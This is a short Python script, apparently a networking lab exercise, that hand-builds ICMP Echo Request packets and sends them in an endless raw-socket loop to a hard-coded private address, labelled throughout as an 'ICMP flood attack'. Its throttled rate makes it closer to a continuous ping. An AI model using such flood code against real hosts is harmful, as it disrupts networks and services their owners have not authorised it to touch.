#!/usr/bin/env python3
import socket
import struct
import time
import signal
import sys

# Function to compute checksum
def cheksum(packet):
    #Calculating the cheksum of the packet
    # Ref R. T. Braden, D. A. Borman, and C. Partridge, “Computing the Internet checksum,” Sep. 1988, doi: https://doi.org/10.17487/rfc1071.
    # REF- “Python and socket library - Raspberry Pi Forums,” Raspberrypi.com, 2024. https://forums.raspberrypi.com/viewtopic.php?t=362742
    # Calculate the ICMP cheksum
    cheksum = 0
    for i in range(0, len(packet), 2):
        cheksum += (packet[i] << 8) + (
            struct.unpack('B', packet[i + 1:i + 2])[0]
            if len(packet[i + 1:i + 2]) else 0
        )

    cheksum = (cheksum >> 16) + (cheksum & 0xFFFF)
    cheksum = ~cheksum & 0xFFFF
    return cheksum

# Function to create ICMP packet
def create_icmp_packet(sequence):
    # ICMP Echo Request has:
    # type = 8, code = 0 id, sequence
    # Ref-“ICMP (Internet Control Message Protocol),” NetworkLessons.com, Jul. 22, 2015. https://networklessons.com/cisco/ccie-routing-switching-written/icmp-internet-control-message-protocol
    # ICMP ID to identify our packet (ideally unique and using some random number) but for now,I have kept it 0xFFFF
    icmp_id = 0xFFFF
    icmp_type = 8
    icmp_code = 0
    # Here we are creating the header of the ICMP packet, but cheksum is inititalized to 0 as we will calculate it later
    data = struct.pack("3s",b'aaa')
    header = struct.pack("!BBHHH3s", 
                        icmp_type, 
                        icmp_code, 
                        0, 
                        icmp_id, 
                        sequence,
                        data)
    chksum = cheksum(header)
    packet = struct.pack("!BBHHH3s", 
                        icmp_type, 
                        icmp_code, 
                        chksum, 
                        icmp_id, 
                        sequence,
                        data)
    return packet

# Handling exit - SIGINT (Ctrl+C)
def signal_handler(sig, frame):
    print("\nStopping ICMP flood")
    sys.exit(0)

# Function to perform ICMP flooding
def icmp_flood(dest_addr):
    try:
        # Trying to create a raw socket
        # Type - Af.INET which is IPv4, type of socket is raw socket, IPPROTO_ICMP is ICMP protocol for ping packets
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        # Telling the kernel not to add IP header, but no need to do right now as we are not manually creating IP header for this ping
        #sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except Exception as e:
        print("Socket creation failed:", e)
        return
    dest_ip = socket.gethostbyname(dest_addr)
    # Looping over and sending mulitple ICMP packets
    
    print(f"Starting ICMP flood to {dest_ip}... Press Ctrl+C to stop.")
     
    # Initialize sequence number, keep updating it for each packet 
    sequence_number = 1
    # Send many packets(Flood) until interrupted by Ctrl+C
    while True:
        try:
            # Create and send ICMP packet
            packet = create_icmp_packet(sequence_number)
            sock.sendto(packet, (dest_ip, 1))
            print(f"Sent ICMP Echo Request #{sequence_number} to {dest_ip}")
            #Incrementing the sequence number unlike the previous ICMP echo where the value was 1
            sequence_number += 1
            # adding delay between packets sending
            time.sleep(0.1)

        except KeyboardInterrupt:
            #Stopping on Ctrl+C
            signal_handler(None, None)  

        except Exception as e:
            print(f"Failed to send packet: {e}")
            break

if __name__ == '__main__':
    # Registering signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)

    #Manually add the destination IP address, easy to change later
    dest_addr = "10.0.0.20"
    
    # Start the ICMP flood attack
    icmp_flood(dest_addr)
